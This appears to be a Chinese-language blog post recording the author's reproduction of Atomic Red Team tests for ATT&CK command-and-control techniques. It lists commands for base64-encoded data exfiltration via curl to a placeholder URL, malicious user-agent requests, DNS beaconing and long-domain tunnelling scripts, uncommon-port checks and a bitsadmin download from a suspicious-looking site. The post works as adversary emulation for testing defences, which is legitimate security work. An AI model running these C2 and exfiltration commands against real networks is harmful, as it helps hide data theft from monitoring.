---
layout: post
title: 跟着ATT&CK学安全之command-and-control
excerpt: "跟着ATT&CK学安全之command-and-control"
categories: [ATT&CK]
comments: true
---
#### 解决无法加载文件 xxxx，因为在此系统上禁止运行脚本
若要在本地计算机上运行您编写的未签名脚本和来自其他用户的签名脚本，请使用以下命令将计算机上的 执行策略更改为 RemoteSigned
```
set-ExecutionPolicy RemoteSigned
```
查看
```
get-ExecutionPolicy
```
#### T1132 - Data Encoding
通常控制命令使用标准的编码进行相互通信
```bash
echo -n 111-11-1111 | base64
curl -XPOST #{base64_data}.#{destination_url}
```
成功复现
### T1071 - Standard Application Layer Protocol
##### 测试1 Malicious User Agents - Powershell
就是一个http请求,通过UserAgent来传输信息,在powershell下运行
```bash
Invoke-WebRequest #{domain} -UserAgent "HttpBrowser/1.0" | out-null
Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
```
成功复现
##### 测试2 Malicious User Agents - CMD
就是一个http请求,通过UserAgent来传输信息,在cmd下运行
```bash
curl -s -A "HttpBrowser/1.0" -m3 #{domain}
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
curl -s -A "*<|>*" -m3 #{domain}
```
成功复现
##### 测试3 Malicious User Agents - Nix
就是一个http请求,通过UserAgent来传输信息,操作平台:linux
```bash
curl -s -A "HttpBrowser/1.0" -m3 #{domain}
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
curl -s -A "*<|>*" -m3 #{domain}
```
成功复现
##### 测试4 DNS Large Query Volume
就是大量的dns请求来传输信息

输入参数
```
--------------------------------------------------------------------------------------
Name  	|	Description  							|	Type  	|	Default Value
--------------------------------------------------------------------------------------
domain  |	Default domain to simulate against 		|	string 	|	example.com
--------------------------------------------------------------------------------------
subdomain 	Subdomain prepended to the domain name	| 	string 	|	atomicredteam
--------------------------------------------------------------------------------------
query_type 	DNS query type 							|	string 	|	TXT				
--------------------------------------------------------------------------------------
query_volume 	Number of DNS queries to send 		|	integer |	1000
--------------------------------------------------------------------------------------
```
powershell中运行
```bash
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
```
例如
```bash
for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type "TXT" "atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).snappyzz.com" -QuickTimeout}
```
成功复现
#### 测试5 DNS Regular Beaconing
```
.\T1071-dns-beacon.ps1  -Domain snappyzz.com -Subdomain subaaaa -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30
```
成功复现
##### 测试6 DNS Long Domain Query
通过子域名传输数据,不断的发送更长的域名长度,来测试蓝队的防守.在powershell中运行
```
.\T1071-dns-domain-length.ps1 -Domain snappyzz.com -Subdomain aaaaaaaaaaaaaaaaaaaaaaaaa -QueryType TXT
```
成功复现
### T1065 - Uncommonly Used Port
就是使用不常用的端口进行通信
##### 测试1 Testing usage of uncommonly used port with PowerShell
在powershell中运行
```bash
test-netconnection -ComputerName snappyzz.com -port 80
```
成功复现
##### 测试2 Testing usage of uncommonly used port
测试平台:linux
```bash
telnet snappyzz.com 80
```
成功复现
### T1102 - Web Service

##### 测试1 Reach out to C2 Pointer URLs via command_prompt
```
bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html
```
成功复现
##### 测试2 Reach out to C2 Pointer URLs via powershell
在powershell中运行
```
Invoke-WebRequest -Uri www.twitter.com
$T1102 = (New-Object System.Net.WebClient).DownloadData("https://www.reddit.com/")
$wc = New-Object System.Net.WebClient
$T1102 = $wc.DownloadString("https://www.aol.com/")
```
成功复现